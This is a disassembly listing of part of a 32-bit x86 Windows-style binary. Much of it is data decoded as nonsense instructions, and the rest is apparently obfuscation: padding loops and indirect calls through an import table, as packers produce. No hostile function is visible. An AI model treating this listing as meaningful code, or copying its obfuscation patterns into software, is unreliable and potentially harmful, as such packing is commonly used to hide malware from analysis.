  409cde:	and    eax,eax
  409ce0:	stc    
  409ce1:	cmp    eax,0x3a37ffda
  409ce6:	shr    BYTE PTR [ebx+0x4b2974f5],1
  409cec:	stos   BYTE PTR es:[edi],al
  409ced:	add    al,0xe0
  409cef:	test   BYTE PTR [edx-0x28],bh
  409cf2:	mov    eax,0x9f470af
  409cf7:	or     eax,0x9cd6c481
  409cfc:	push   es
  409cfd:	xor    al,0x1e
  409cff:	jo     0x409cdb
  409d01:	jle    0x409c8c
  409d03:	cdq    
  409d04:	scas   al,BYTE PTR es:[edi]
  409d05:	jl     0x409c8f
  409d07:	(bad)  
  409d08:	neg    bh
  409d0a:	xlat   BYTE PTR ds:[ebx]
  409d0b:	mov    ebp,0x4ecfad55
  409d10:	mov    fs,WORD PTR [eax]
  409d12:	dec    eax
  409d13:	call   0xbf51caf4
  409d18:	push   0x4e
  409d1a:	cmp    DWORD PTR ds:0x1da2b7c7,edx
  409d20:	js     0x409da1
  409d22:	in     eax,0xd5
  409d24:	inc    ebp
  409d25:	add    al,0xa0
  409d27:	jae    0x409d97
  409d29:	mov    edx,0x90519505
  409d2e:	(bad)  [edi+0x19d9756]
  409d34:	inc    eax
  409d35:	cwde   
  409d36:	sbb    al,ch
  409d38:	repnz inc ecx
  409d3a:	neg    DWORD PTR [ebx-0x2c5503c8]
  409d40:	out    dx,eax
  409d41:	rcl    BYTE PTR [edx+0x1],cl
  409d44:	jmp    0x9004:0x77299598
  409d4b:	pop    ebx
  409d4c:	push   ds
  409d4d:	pop    ss
  409d4e:	hlt    
  409d4f:	xchg   ebp,eax
  409d50:	and    bl,BYTE PTR [esi+0x7e]
  409d53:	mov    bl,0xf1
  409d55:	jl     0x409daf
  409d57:	in     eax,0xec
  409d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d5a:	rol    ebp,cl
  409d5c:	pop    esi
  409d5d:	mov    ebx,0xfeba8af6
  409d62:	aam    0xfe
  409d64:	repnz cmp edi,DWORD PTR [ebp+eiz*2+0x21d09a6]
  409d6c:	xor    esi,edx
  409d6e:	jne    0x409d91
  409d70:	pop    edx
  409d71:	mov    eax,esi
  409d73:	sub    esi,edx
  409d75:	cld    
  409d76:	lock push ss
  409d78:	pop    eax
  409d79:	scas   al,BYTE PTR es:[edi]
  409d7a:	mov    ebx,0x7516e147
  409d7f:	adc    eax,0xc7c985a5
  409d84:	add    eax,0x433717
  409d89:	out    0x34,eax
  409d8b:	add    BYTE PTR [eax],al
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43370b
  409d9c:	sub    DWORD PTR ds:0x4337df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433753,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	loopne 0x409d6e
  409dc0:	aaa    
  409dc1:	pop    esp
  409dc2:	cmp    dl,ah
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	mov    ecx,0xdd14df9a
  409dcf:	adc    al,0xb0
  409dd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dd2:	push   ds
  409dd3:	jecxz  0x409de1
  409dd5:	pop    edx
  409dd6:	sub    al,0x49
  409dd8:	jmp    0xd5d1:0xf37c6319
  409ddf:	pop    DWORD PTR [edi-0x59063061]
  409de5:	sbb    eax,0xc6c4e54a
  409dea:	stos   DWORD PTR es:[edi],eax
  409deb:	or     DWORD PTR [ecx+0x7c],edx
  409dee:	adc    bh,bl
  409df0:	lds    esi,FWORD PTR [eax]
  409df2:	dec    edi
  409df3:	push   eax
  409df4:	aad    0xf1
  409df6:	xor    eax,0x850378f8
  409dfb:	cmp    al,0xac
  409dfd:	es icebp 
  409dff:	rcl    DWORD PTR [edx+0x5b],0x2
  409e03:	mov    ds:0x2e834b1f,al
  409e08:	push   ss
  409e09:	or     dh,BYTE PTR [esi+0x2630dddb]
  409e0f:	mov    edi,0x46286e3d
  409e14:	jp     0x409da5
  409e16:	stc    
  409e17:	(bad)  
  409e18:	call   0x51b0fbb1
  409e1d:	cld    
  409e1e:	aas    
  409e1f:	sub    DWORD PTR [eax],esp
  409e21:	xor    ebx,ecx
  409e23:	or     dh,cl
  409e25:	sbb    edi,ebx
  409e27:	jnp    0x409e23
  409e29:	scas   ax,WORD PTR es:[edi]
  409e2b:	in     eax,dx
  409e2c:	ror    BYTE PTR [edx],1
  409e2e:	call   0x9f417ec0
  409e33:	repnz retf 
  409e35:	jmp    DWORD PTR [edi-0x7e]
  409e38:	jg     0x409e88
  409e3a:	clc    
  409e3b:	xchg   edx,eax
  409e3c:	xlat   BYTE PTR ds:[ebx]
  409e3d:	das    
  409e3e:	pop    es
  409e3f:	loop   0x409e02
  409e41:	or     al,0x11
  409e43:	lods   al,BYTE PTR ds:[esi]
  409e44:	jbe    0x409e9d
  409e46:	inc    ecx
  409e47:	and    BYTE PTR [eax+0x368ce0fe],0x5f
  409e4e:	push   0xd78ed01d
  409e53:	rol    eax,0xe9
  409e56:	int3   
  409e57:	mov    ebx,0x3e3915c8
  409e5c:	mov    bh,0x7f
  409e5e:	push   ecx
  409e5f:	inc    edx
  409e60:	sub    bh,al
  409e62:	or     ah,BYTE PTR [eax+0x28e88457]
  409e68:	dec    eax
  409e69:	push   edx
  409e6a:	test   DWORD PTR [esp+ecx*8+0x20],edi
  409e6e:	push   esi
  409e6f:	push   cs
  409e70:	ret    0x40a5
  409e73:	sub    al,0xa6
  409e75:	pop    ss
  409e76:	mov    al,ds:0x1563fc9f
  409e7b:	jbe    0x409ead
  409e7d:	in     al,dx
  409e7e:	dec    esp
  409e7f:	dec    edi
  409e80:	jbe    0x409e86
  409e82:	adc    ecx,0x22eb275e
  409e88:	mov    dh,0x6
  409e8a:	test   BYTE PTR ss:[ecx],ah
  409e8d:	or     al,0x12
  409e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e90:	shr    BYTE PTR [ebx+0x58],1
  409e93:	push   es
  409e94:	and    edi,DWORD PTR [eax+ebx*8]
  409e97:	fs push esi
  409e99:	imul   esp,esi,0x6eaec37d
  409e9f:	jnp    0x409e37
  409ea1:	fisub  DWORD PTR ds:0x10a3c513
  409ea7:	xchg   BYTE PTR [esi+0x19a103f6],bl
  409ead:	push   ss
  409eae:	out    dx,eax
  409eaf:	and    DWORD PTR ds:0x33b9c0d2,edi
  409eb5:	aad    0xaf
  409eb7:	test   BYTE PTR [eax],0x12
  409eba:	(bad)  
  409ebb:	test   dh,ch
  409ebd:	push   cs
  409ebe:	pop    esi
  409ebf:	push   edx
  409ec0:	das    
  409ec1:	xor    eax,0xdf3d92c4
  409ec6:	js     0x409e82
  409ec8:	jmp    0xfea4f276
  409ecd:	lods   eax,DWORD PTR ds:[esi]
  409ece:	mov    dl,0xa1
  409ed0:	add    ebx,edx
  409ed2:	mul    BYTE PTR [edi+0x18]
  409ed5:	jno    0x409f4b
  409ed7:	jle    0x409f3a
  409ed9:	(bad)  
  409eda:	push   ebx
  409edb:	icebp  
  409edc:	adc    ebp,DWORD PTR [ecx-0x5f]
  409edf:	sub    al,0xfd
  409ee1:	xor    BYTE PTR [esi-0x34edbc5],bh
  409ee7:	je     0x409eea
  409ee9:	jg     0x409e89
  409eeb:	retf   
  409eec:	sub    DWORD PTR [ebp-0x6d],ebx
  409eef:	mov    esp,0x4b9bf4a4
  409ef4:	jns    0x409eff
  409ef6:	inc    edx
  409ef7:	add    DWORD PTR [ebp+edi*1+0x19658d47],0xf311411b
  409f02:	jge    0x409f2b
  409f04:	xor    dl,BYTE PTR [esi-0x56262590]
  409f0a:	add    BYTE PTR [edx-0x25020655],ah
  409f10:	cmc    
  409f11:	jo     0x409eb8
  409f13:	fisttp WORD PTR [esi+0x16]
  409f16:	sbb    esi,DWORD PTR [ebp+0x2e3e8aa8]
  409f1c:	adc    edx,edi
  409f1e:	mov    ch,0x3f
  409f20:	jl     0x409f08
  409f22:	loope  0x409f20
  409f24:	loope  0x409ee5
  409f26:	pop    edi
  409f27:	adc    DWORD PTR [eax+0x5fbd51c8],edi
  409f2d:	push   ebp
  409f2e:	and    edx,DWORD PTR [edi+0x77]
  409f31:	js     0x409f1d
  409f33:	(bad)  
  409f34:	into   
  409f35:	mov    edx,0x35da250e
  409f3a:	sub    edi,ecx
  409f3c:	pushf  
  409f3d:	retf   0xba9d
  409f40:	add    DWORD PTR [ebx-0x51],eax
  409f43:	fnstenv ds:0x6a4dc444
  409f49:	pop    edx
  409f4a:	dec    esi
  409f4b:	or     bl,BYTE PTR [eax+0x4c]
  409f4e:	out    dx,eax
  409f4f:	imul   bl
  409f51:	sub    bh,BYTE PTR [ebx+0x22e00f56]
  409f57:	je     0x409f74
  409f59:	stos   BYTE PTR es:[edi],al
  409f5a:	mov    al,0xbf
  409f5c:	mov    BYTE PTR [edi-0xb],dh
  409f5f:	mov    ah,ah
  409f61:	out    dx,al
  409f62:	(bad)  
  409f63:	stc    
  409f64:	xchg   edx,eax
  409f65:	mov    ecx,0x323a4900
  409f6a:	enter  0x63e1,0x6d
  409f6e:	pop    es
  409f6f:	pop    edx
  409f70:	add    ah,BYTE PTR [edx-0x1a893d62]
  409f76:	push   ds
  409f77:	xor    al,0xa0
  409f79:	or     ch,BYTE PTR [ecx]
  409f7b:	daa    
  409f7c:	ror    BYTE PTR [ebp-0x6aa75673],cl
  409f82:	inc    ecx
  409f83:	mov    ds:0x86a43b26,eax
  409f88:	retf   
  409f89:	ret    
  409f8a:	inc    eax
  409f8b:	ja     0x409fc2
  409f8d:	pop    edx
  409f8e:	iret   
  409f8f:	cmp    esi,DWORD PTR ds:0xc5b8088c
  409f95:	jmp    0xac6d:0xb755481e
  409f9c:	adc    al,0x57
  409f9e:	mov    ds:0x385e1a6e,al
  409fa3:	and    al,0x59
  409fa5:	and    BYTE PTR ds:0xcde984bc,cl
  409fab:	push   es
  409fac:	call   0xb5b4:0xe96891cf
  409fb3:	sti    
  409fb4:	cwde   
  409fb5:	and    BYTE PTR [ebx+eax*4],ah
  409fb8:	push   eax
  409fb9:	adc    BYTE PTR [edi-0x6c22b0b6],ah
  409fbf:	push   esi
  409fc0:	adc    dh,BYTE PTR [esi-0x60]
  409fc3:	mov    fs,WORD PTR [edx]
  409fc5:	add    bl,BYTE PTR [edi-0x2a3154c]
  409fcb:	xchg   dh,bl
  409fcd:	jge    0x409fac
  409fcf:	aaa    
  409fd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fd1:	sub    al,0xa6
  409fd3:	out    dx,eax
  409fd4:	in     al,dx
  409fd5:	push   esi
  409fd6:	or     al,0xe5
  409fd8:	out    0x46,eax
  409fda:	pop    es
  409fdb:	imul   ecx,DWORD PTR ds:0x5a6b5be3,0x73
  409fe2:	je     0x40a006
  409fe4:	adc    eax,0x8bdc7d36
  409fe9:	mov    esi,0x39e38112
  409fee:	bound  edx,QWORD PTR [eax-0x707d7320]
  409ff4:	add    DWORD PTR [edx-0x5f],ebx
  409ff7:	or     al,al
  409ff9:	aaa    
  409ffa:	cdq    
  409ffb:	scas   eax,DWORD PTR es:[edi]
  409ffc:	lods   al,BYTE PTR ds:[esi]
  409ffd:	and    esp,DWORD PTR [ebx-0x72]
  40a000:	xor    DWORD PTR [ebp-0x4ca9b839],ebx
  40a006:	mov    cl,0x64
  40a008:	mov    eax,0x4e3c13ac
  40a00d:	call   0xaf504a57
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x4337d3
  40a01e:	sbb    DWORD PTR ds:0x43370f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433763,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433723
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43375b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43375b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43375b,ecx
  40a059:	cmp    DWORD PTR ds:0x43375b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43393e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43375b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43370b,0x11
  40a090:	cmp    DWORD PTR ds:0x43370b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43370b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43370b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43370b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43370b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43370b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43370b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433703,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43376f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433713
  40a0ff:	mov    DWORD PTR ds:0x43376f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433767,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	sbb    al,BYTE PTR ds:0xe0825358
  40a12c:	jle    0x40a1ac
  40a12e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a132:	fwait
  40a133:	add    DWORD PTR ds:0x164c3a9a,eax
  40a139:	(bad)  
  40a13a:	pop    esp
  40a13b:	scas   al,BYTE PTR es:[edi]
  40a13c:	pop    ebx
  40a13d:	cld    
  40a13e:	dec    ecx
  40a13f:	add    eax,0xcde9190f
  40a144:	jae    0x40a0e6
  40a146:	inc    ebp
  40a147:	cmpps  xmm2,XMMWORD PTR [ebp-0x45],0xc9
  40a14c:	dec    eax
  40a14d:	pop    esp
  40a14e:	or     eax,0x813ec8e9
  40a153:	fs mov eax,0x527b2a09
  40a159:	nop
  40a15a:	iret   
  40a15b:	sar    BYTE PTR [edx],cl
  40a15d:	mov    esp,0xb42293fd
  40a162:	mov    al,0x21
  40a164:	ins    BYTE PTR es:[edi],dx
  40a165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a166:	lods   al,BYTE PTR ds:[esi]
  40a167:	retf   
  40a168:	dec    ebp
  40a169:	pop    esi
  40a16a:	ror    cl,0x48
  40a16d:	sbb    edx,edx
  40a16f:	js     0x40a194
  40a171:	loope  0x40a1ac
  40a173:	jbe    0xa9514dc4
  40a179:	mov    eax,DWORD PTR [edx-0x499651a3]
  40a17f:	jne    0x40a1a0
  40a181:	aad    0xda
  40a183:	or     al,0x2f
  40a185:	lahf   
  40a186:	clc    
  40a187:	sbb    DWORD PTR [ecx+0x71],0x2d
  40a18b:	sbb    al,0xe7
  40a18d:	pushf  
  40a18e:	ds push ds
  40a190:	sbb    bl,ah
  40a192:	and    al,0xa2
  40a194:	mov    dl,0xcd
  40a196:	in     al,dx
  40a197:	or     al,0x71
  40a199:	daa    
  40a19a:	mov    dh,BYTE PTR [edi-0xa]
  40a19d:	mov    dl,0x3e
  40a19f:	jno    0x40a196
  40a1a1:	mov    dh,0x90
  40a1a3:	xlat   BYTE PTR ds:[ebx]
  40a1a4:	enter  0x4762,0x2f
  40a1a8:	imul   eax,DWORD PTR [edi],0x2d198a2a
  40a1ae:	je     0x40a15a
  40a1b0:	push   0x5a
  40a1b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1b3:	dec    esp
  40a1b4:	call   0x1f41:0xa1ee0f84
  40a1bb:	inc    edx
  40a1bc:	scas   eax,DWORD PTR es:[edi]
  40a1bd:	xor    BYTE PTR [ebx-0x45],ch
  40a1c0:	cdq    
  40a1c1:	or     al,0xe8
  40a1c3:	inc    ebx
  40a1c4:	int    0x8a
  40a1c6:	pop    ebx
  40a1c7:	fimul  DWORD PTR [ebp+0x1a30e23]
  40a1cd:	call   DWORD PTR [ebx-0x517fc689]
  40a1d3:	fdivr  DWORD PTR [ebx*4-0x6b4b57c7]
  40a1da:	mov    dl,0xb6
  40a1dc:	and    BYTE PTR ds:0x112f4e5d,bh
  40a1e2:	adc    ebp,esp
  40a1e4:	xchg   DWORD PTR [ebx+0x39],eax
  40a1e7:	sub    al,0x1a
  40a1e9:	adc    DWORD PTR [eax],ecx
  40a1eb:	xchg   ebx,eax
  40a1ed:	or     DWORD PTR [edx-0x7d],edi
  40a1f0:	xchg   bx,ax
  40a1f2:	shr    edi,0xb3
  40a1f5:	sar    DWORD PTR [esi],cl
  40a1f7:	dec    esp
  40a1f8:	sbb    DWORD PTR ss:[edi+0x22bf788b],esp
  40a1ff:	repz mov WORD PTR [edx+0x71215a21],fs
  40a206:	retf   0x96f0
  40a209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a20a:	sub    bh,ch
  40a20c:	fst    QWORD PTR [edx+0x60]
  40a20f:	mov    BYTE PTR [ebp-0x76],ah
  40a212:	mov    ds:0xaee8df5b,eax
  40a217:	imul   eax,DWORD PTR [edx+0x95cfae7],0x1983c5ef
  40a221:	dec    ecx
  40a222:	out    0xce,al
  40a224:	sub    al,0x21
  40a226:	push   ds
  40a227:	cdq    
  40a228:	add    DWORD PTR [edi],0xdc310f9b
  40a22e:	ins    BYTE PTR es:[edi],dx
  40a22f:	inc    ebx
  40a230:	jmp    0x6cfb1a3a
  40a235:	dec    ecx
  40a236:	mov    WORD PTR ds:0xd3e75a45,ds
  40a23c:	dec    edi
  40a23d:	mov    BYTE PTR [ebx-0x244f2872],0x5c
  40a244:	add    esp,DWORD PTR [edx+0x73]
  40a247:	shl    al,0x4e
  40a24a:	daa    
  40a24b:	das    
  40a24c:	inc    BYTE PTR [ebx]
  40a24e:	ins    DWORD PTR es:[edi],dx
  40a24f:	jecxz  0x40a210
  40a251:	inc    esp
  40a252:	rol    BYTE PTR [edi-0x67eaa286],0xf5
  40a259:	sub    BYTE PTR [ebx-0x24],0x20
  40a25d:	or     edx,DWORD PTR [eax-0x6b]
  40a260:	div    BYTE PTR [edi-0x1a]
  40a263:	push   esi
  40a264:	lahf   
  40a265:	push   ecx
  40a266:	mov    ecx,0x126dea8b
  40a26b:	sub    BYTE PTR cs:[ebx-0x24af8ec0],al
  40a272:	bound  ebp,QWORD PTR [edi+edi*4]
  40a275:	ror    BYTE PTR [ebp-0x4],0xa
  40a279:	mov    ch,0x21
  40a27b:	ja     0x40a2c4
  40a27d:	or     dl,BYTE PTR [eax+ebx*8+0x17]
  40a281:	xor    eax,0x8ec19386
  40a286:	push   esp
  40a287:	daa    
  40a288:	push   esi
  40a289:	aam    0x9b
  40a28b:	shl    BYTE PTR gs:[edx],cl
  40a28e:	push   ecx
  40a28f:	cmp    al,0x5c
  40a291:	mov    ds:0x542c1236,al
  40a296:	gs mov esp,0x1752f56e
  40a29c:	pop    ss
  40a29d:	inc    eax
  40a29e:	push   0xa01fb906
  40a2a3:	mov    edx,0xb0a1ad31
  40a2a8:	and    eax,0x12b358bb
  40a2ad:	push   edi
  40a2ae:	stos   DWORD PTR es:[edi],eax
  40a2af:	sbb    BYTE PTR [esi+0x1d],0x3d
  40a2b3:	or     eax,0x41df4f7e
  40a2b8:	and    ebp,DWORD PTR [esp+ebp*1]
  40a2bb:	clc    
  40a2bc:	outs   dx,BYTE PTR ds:[esi]
  40a2bd:	dec    eax
  40a2be:	push   0x65
  40a2c0:	fs xchg ebx,edx
  40a2c3:	clc    
  40a2c4:	fiadd  DWORD PTR [edx+0x704fd6b7]
  40a2ca:	mov    dl,0x6a
  40a2cc:	imul   edi,DWORD PTR [eax+0x68d00947],0x138c7521
  40a2d6:	fbld   TBYTE PTR [ebp-0x4a1a13b0]
  40a2dc:	adc    esi,ebp
  40a2de:	jae    0x40a358
  40a2e0:	add    esp,DWORD PTR [ecx+0x50]
  40a2e3:	scas   al,BYTE PTR es:[edi]
  40a2e4:	fucomp st(6)
  40a2e6:	xor    BYTE PTR fs:[edi+ecx*1],bl
  40a2ea:	es hlt 
  40a2ec:	dec    esp
  40a2ed:	sbb    dl,bl
  40a2ef:	pop    esp
  40a2f0:	xchg   ebx,eax
  40a2f1:	sub    ecx,DWORD PTR [edi+ebx*2]
  40a2f4:	mov    ecx,ecx
  40a2f6:	push   ebp
  40a2f7:	add    ah,BYTE PTR [eax+eiz*1-0x52d8481d]
  40a2fe:	outs   dx,BYTE PTR ds:[esi]
  40a2ff:	outs   dx,BYTE PTR ds:[esi]
  40a300:	mov    WORD PTR [ebp+eax*2-0x7d7ee2f5],?
  40a307:	mov    BYTE PTR [edx-0x5e],dl
  40a30a:	leave  
  40a30b:	pushf  
  40a30c:	push   esp
  40a30d:	(bad)  
  40a30e:	imul   esp,DWORD PTR [eax-0x47],0x32
  40a312:	imul   ebp,DWORD PTR [edi],0xfe80986a
  40a318:	out    0xea,eax
  40a31a:	sbb    bh,ch
  40a31c:	mov    dl,0x46
  40a31e:	jl     0x40a2fc
  40a320:	scas   al,BYTE PTR es:[edi]
  40a321:	dec    edx
  40a322:	xor    dl,BYTE PTR [eax-0x15]
  40a325:	(bad)  
  40a326:	mov    eax,0x60e755f4
  40a32b:	xor    al,0x24
  40a32d:	outs   dx,BYTE PTR ds:[esi]
  40a32e:	fwait
  40a32f:	add    eax,DWORD PTR [ecx]
  40a331:	push   0xffffffd8
  40a333:	mov    edx,0xbe34a8ed
  40a338:	inc    esp
  40a339:	push   0xa9e3bf94
  40a33e:	adc    bl,dl
  40a340:	popf   
  40a341:	mov    al,0xcb
  40a343:	daa    
  40a344:	adc    BYTE PTR [ebx-0x48fb5afa],dl
  40a34a:	aam    0xd1
  40a34c:	sbb    cl,BYTE PTR [edi-0x607d2bb7]
  40a352:	jo     0x40a2e5
  40a354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a355:	int3   
  40a356:	nop
  40a357:	lahf   
  40a358:	push   DWORD PTR [ebp-0x41]
  40a35b:	lds    edi,FWORD PTR [ebx+0x342776d2]
  40a361:	nop
  40a362:	xchg   ebp,eax
  40a363:	jbe    0x40a2e6
  40a365:	lods   eax,DWORD PTR ds:[esi]
  40a366:	lock push es
  40a368:	cmp    BYTE PTR [ebp+0x40],ah
  40a36b:	sub    BYTE PTR [edi+0x1e60e8db],al
  40a371:	sbb    BYTE PTR [edi-0x41ee605e],cl
  40a377:	outs   dx,BYTE PTR ds:[esi]
  40a378:	mov    ecx,DWORD PTR [ebp-0x18]
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x4336fb,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4336fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4336fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4336fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4336fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4337ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43376b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433767,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433767,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433767,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433797
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433767,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433767
  40a434:	dec    eax
  40a435:	mov    ds:0x433767,eax
  40a43a:	mov    eax,ds:0x433767
  40a43f:	dec    eax
  40a440:	mov    ds:0x433767,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43371f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43382f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433823,0x4337a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433707,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	and    eax,DWORD PTR [ecx-0x11b3e634]
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	fst    QWORD PTR [eax+ebx*8-0x57c1da71]
  40a4ae:	scas   al,BYTE PTR es:[edi]
  40a4af:	sub    edi,DWORD PTR [edx-0x67]
  40a4b2:	push   ds
  40a4b3:	stos   DWORD PTR es:[edi],eax
  40a4b4:	loope  0x40a45c
  40a4b6:	pop    ecx
  40a4b7:	(bad)
  40a4ba:	and    edi,ecx
  40a4bc:	pop    edx
  40a4bd:	(bad)  
  40a4be:	jmp    0x73cb:0x46a009f6
  40a4c5:	out    0x3e,al
  40a4c7:	mov    cl,0xf6
  40a4c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4ca:	ins    DWORD PTR es:[edi],dx
  40a4cb:	sbb    cl,ch
  40a4cd:	in     al,0xa0
  40a4cf:	push   edx
  40a4d0:	pop    esp
  40a4d1:	mov    cs,WORD PTR [ebx+ebp*1]
  40a4d4:	or     DWORD PTR [edi+edi*1+0x651c9887],0xf338cfbd
  40a4df:	imul   esi,DWORD PTR [ecx],0xd275aeb2
  40a4e5:	push   cs
  40a4e6:	bound  eax,QWORD PTR [esi-0x20134c38]
  40a4ec:	push   ebx
  40a4ed:	sar    BYTE PTR [ebx+0x3c],1
  40a4f0:	or     BYTE PTR [eax-0x5a],cl
  40a4f3:	xor    al,0x24
  40a4f5:	outs   dx,DWORD PTR ds:[esi]
  40a4f6:	les    ebp,FWORD PTR [edi+edi*2+0xf16e4df]
  40a4fd:	sub    DWORD PTR [esi-0x55],0xdb334f14
  40a504:	xor    ebp,ebx
  40a506:	rcl    BYTE PTR [ebp-0x25113ab4],0xde
  40a50d:	push   0x9d008214
  40a512:	mov    bl,0x19
  40a514:	add    eax,0xef1d5fda
  40a519:	jnp    0x40a4ba
  40a51b:	mov    ebx,0xb659385
  40a520:	xor    bl,BYTE PTR [esi-0x1649eae8]
  40a526:	sbb    al,0xb4
  40a528:	inc    esi
  40a529:	mov    edx,0x5c2d3c0d
  40a52e:	cmp    DWORD PTR [eax],ecx
  40a530:	xchg   edi,eax
  40a531:	iret   
  40a532:	jmp    0x68c5e722
  40a537:	mov    edi,0x42604d20
  40a53c:	dec    edx
  40a53d:	arpl   WORD PTR [esi+0x73fc7251],bx
  40a543:	mov    esp,0xa9a502a
  40a548:	xor    ebp,DWORD PTR [ecx+0x25]
  40a54b:	sbb    esi,ebp
  40a54d:	pusha  
  40a54e:	sub    ah,BYTE PTR [ebp-0x5e6093e6]
  40a554:	dec    ecx
  40a555:	cwde   
  40a556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a557:	shr    DWORD PTR [ecx+0x4],cl
  40a55a:	mov    ah,bh
  40a55c:	lahf   
  40a55d:	pop    esi
  40a55e:	jno    0x40a56d
  40a560:	jo     0x40a50d
  40a562:	mov    ebp,0xf118a1b0
  40a567:	data16 sub al,0xe2
  40a56a:	mov    esp,0xa3cd057
  40a56f:	in     eax,dx
  40a570:	cmovns edx,edi
  40a573:	sahf   
  40a574:	fdiv   QWORD PTR [eax]
  40a576:	mov    bh,0xc1
  40a578:	loop   0x40a5ba
  40a57a:	clc    
  40a57b:	pop    es
  40a57c:	adc    al,0xf2
  40a57e:	jb     0x40a5ca
  40a580:	mov    ah,0x36
  40a582:	sub    bh,BYTE PTR [esi]
  40a584:	popf   
  40a585:	rcl    ch,cl
